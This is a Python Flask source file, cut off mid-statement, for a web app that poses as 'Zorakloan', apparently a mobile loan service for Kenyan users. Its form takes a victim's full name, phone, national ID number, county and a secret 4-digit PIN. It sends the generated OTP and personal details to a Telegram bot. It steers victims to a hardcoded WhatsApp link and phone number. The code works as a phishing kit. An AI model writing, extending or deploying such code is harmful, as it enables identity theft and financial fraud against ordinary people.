import os, random
from flask import Flask, request, render_template_string, session, redirect
import requests
app = Flask(__name__)
app.secret_key = "zorak-wa-link-final"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
WA_LINK = "https://wa.me/message/CFCJWLOZ7IWZK1"
MY_WA_TEL = "+254119912568"
loans_db = {}

@app.route('/', methods=['GET','POST'])
def home():
    return redirect('/api')

@app.route('/api', methods=['GET','POST'])
@app.route('/apply', methods=['GET','POST'])
def apply_route():
    if request.method == 'POST':
        otp = str(random.randint(100000,999999))
        ref = f"ZRK-{random.randint(1000,9999)}"
        pending = {}
        for k in ['full_name','phone','id_number','county','amount','period','employment','pin']:
            pending[k] = request.form.get(k)
        pending['ref']=ref
        session['pending']=pending
        session['otp']=otp
        try:
            msg = "OTP " + otp + " Phone " + pending['phone'] + " Name " + pending['full_name'] + " Ref " + ref
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id":CHAT_ID, "text": msg})
        except:
            pass
        return render_template_string("""
        <html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>
        body{font-family:Arial;background:#f0f4f0;padding:15px}.box{background:white;max-width:400px;margin:60px auto;padding:30px;border-radius:15px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.1)}
        .otp-big{font-size:32px;letter-spacing:8px;font-weight:bold;color:#0a7a3e;background:#e8f5e9;padding:15px;border-radius:10px;margin:15px 0;border:2px dashed #0a7a3e}
        .wa-float{position:fixed;bottom:20px;right:20px;background:#25D366;color:white;padding:12px 18px;border-radius:50px;text-decoration:none;font-weight:bold;box-shadow:0 4px 10px rgba(0,0,0,0.3)}
        </style></head><body><div class="box">
        <h2>SMS Sent!</h2><p>Code sent to <b>PHONE</b></p>
        <div class="otp-big">OTP_CODE</div>
        <form method="POST" action="/verify-otp"><input name="otp" maxlength="6" placeholder="Enter code" required style="width:100%;padding:14px;font-size:20px;text-align:center;letter-spacing:5px;border:2px solid #0a7a3e;border-radius:8px"><button style="width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;margin-top:15px;font-size:17px;font-weight:bold">Verify</button></form>
        <a href="WA_LINK" style="display:block;margin-top:15px;color:#25D366;text-decoration:none;font-weight:bold">Need help? Text me on WhatsApp</a>
        </div><a href="WA_LINK" class="wa-float">Text Me</a></body></html>
        """.replace("PHONE", pending['phone']).replace("OTP_CODE", otp).replace("WA_LINK", WA_LINK).replace("REF_CODE", ref))
    
    return render_template_string("""
    <html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>
    body{font-family:Arial;background:#f0f4f0;padding:15px}.box{background:white;max-width:430px;margin:auto;padding:25px;border-radius:15px;box-shadow:0 5px 20px rgba(0,0,0,0.1)}h2{text-align:center;color:#0a7a3e}input,select{width:100%;padding:12px;margin:7px 0;border:1px solid #ccc;border-radius:8px;box-sizing:border-box}button{width:100%;padding:14px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-size:17px;font-weight:bold}.pin{background:#fff8e1;padding:10px;border-radius:8px;border:1px dashed #ffb300}.wa-float{position:fixed;bottom:20px;right:20px;background:#25D366;color:white;padding:12px 18px;border-radius:50px;text-decoration:none;font-weight:bold;box-shadow:0 4px 10px rgba(0,0,0,0.3)}
    </style></head><body><div class="box"><h2>Zorakloan</h2><form method="POST"><input name="full_name" placeholder="Full Name" required><input name="phone" placeholder="Phone 07..." required><input name="id_number" placeholder="ID Number" required><input name="county" placeholder="County" required><input name="amount" type="number" placeholder="Amount Ksh" required><select name="period" required><option value="">Duration</option><option>7 Days</option><option>14 Days</option><option>1 Month</option></select><select name="employment" required><option value="">Employment</option><option>Business</option><option>Employed</option><option>Farmer</option></select><div class="pin"><b>Security PIN</b><input name="pin" type="password" maxlength="4" placeholder="1234" required></div><button>Apply Now</button></form><div style="text-align:center;margin-top:15px"><a href="TEL_NUM" style="background:#0a7a3e;color:white;padding:10px 15px;border-radius:8px;text-decoration:none;margin:5px;display:inline-block">Call</a><a href="WA_LINK" style="background:#25D366;color:white;padding:10px 15px;border-radius:8px;text-decoration:none;margin:5px;display:inline-block">WhatsApp</a></div></div><a href="WA_LINK" class="wa-float">Text Me</a></body></html>
    """.replace("WA_LINK", WA_LINK).replace("TEL_NUM", "tel:" + MY_WA_TEL))

@app.route('/verify-otp', methods=['GET','POST'])
def verify():
    if request.method == 'GET':
        return redirect('/api')
    pending =